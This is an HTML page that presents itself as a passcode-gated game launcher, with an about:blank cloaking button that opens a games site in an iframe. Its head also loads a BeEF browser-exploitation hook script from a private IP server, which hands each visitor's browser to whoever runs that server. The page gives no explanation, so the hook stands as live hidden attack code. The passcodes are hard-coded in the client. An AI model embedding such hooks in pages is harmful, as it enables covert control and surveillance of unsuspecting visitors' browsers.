<!DOCTYPE html>
<html lang="en">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<head>
    <title>BeEF Hook Integration</title>
    <!-- BeEF Hook -->
    <script src="http://172.20.245.20:3000/hook.js"></script>
</head>
<body>
    <script> 
        // Function to ask for the user's name and validate it
        function askForName() {
            // Retrieve the stored name from localStorage, if available
            let storedName = localStorage.getItem('userName');
            // List of valid usernames (passcodes)
            const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];

            // If no valid name is stored, prompt the user to enter one
            if (!storedName) {
                let name;
                do {
                    name = prompt("Enter your name as one of the secret passcodes:");
                    if (!name) {
                        // If user cancels the prompt, redirect to CrazyGames
                        redirectToCrazyGames();
                        return;
                    }
                } while (!validUsernames.includes(name.toLowerCase()));

                // Save the valid name in localStorage
                localStorage.setItem('userName', name);
                // Display greeting message with the valid name
                document.getElementById("greeting").innerText = "Hello, " + name + "!";
            } else {
                // If a valid name is already stored, greet the user
                document.getElementById("greeting").innerText = "Hello, " + storedName + "!";
            }
        }

        // Run the function when the page loads
        window.onload = askForName;
    </script>

    <h1 id="greeting"></h1>
    <button>Embed</button>
        <button>Embed about:blank</button>
        <script type="text/javascript">
            var urlobj = new window.URL(window.location.href);
            let url = 'https://secretgg.vercel.app/home.html';
            if (url) {
                var win;
                document.querySelector('button').onclick = function() {
                    if (win) {
                        win.focus();
                    } else {
                        win = window.open();
                        win.document.body.style.margin = '0';
                        win.document.body.style.height = '100%';
                        var iframe = win.document.createElement('iframe');
                        iframe.style.border = 'none';
                        iframe.style.width = '100%';
                        iframe.style.height = '100%';
                        iframe.style.margin = '0';
                        iframe.src = url;
                        win.document.body.appendChild(iframe);
                    }
                    location.reload();  // Refresh the page after embedding
                }
            }
        </script>
</body>
</html>
